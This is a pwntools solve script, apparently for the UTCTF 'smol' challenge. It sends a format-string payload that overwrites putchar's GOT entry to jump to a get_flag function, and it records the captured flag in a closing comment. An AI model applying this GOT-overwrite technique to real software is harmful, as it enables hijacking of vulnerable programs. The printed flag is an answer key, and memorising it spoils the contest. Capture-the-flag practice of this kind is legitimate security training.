from pwn import *
import os
import random
import time

context.binary ='./smol'
elf=context.binary
libc = elf.libc
context.log_level = "DEBUG"

gs = '''
break *0x40131f
'''

# cmp canary 0x5555555556e5

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('pwn.utctf.live', 5004)
        return process(elf.path)

print(elf.plt)
print(elf.symbols)

putchar_plt=0x4010a0
puts_plt=0x4010b0 
printf_plt=0x4010d0
gets_plt=0x401100
main=0x4011f6
get_flag=0x401349 # 4199241

p = start()
payload = b""
padd=16*6
ANTES=elf.sym.got['putchar']
print('GOT ANTES> ',hex(ANTES))
payload+= p64(ANTES)
payload+= b'A'*(padd-8)
payload+=b'B'*16
payload+=(b"%6$4937x" )
payload+=(b"%6$hn" )
print('len(payload)>',len(payload))
print(payload)
p.sendlineafter(b'What kind of data do you have?\n',payload)
DESPUES=hex(elf.sym.got['putchar'])
print('GOT DESPUEES> ',DESPUES)
p.sendlineafter(b'Give me your data\n',b'A')
p.interactive()
p.close()
# utflag{just_a_little_salami15983350}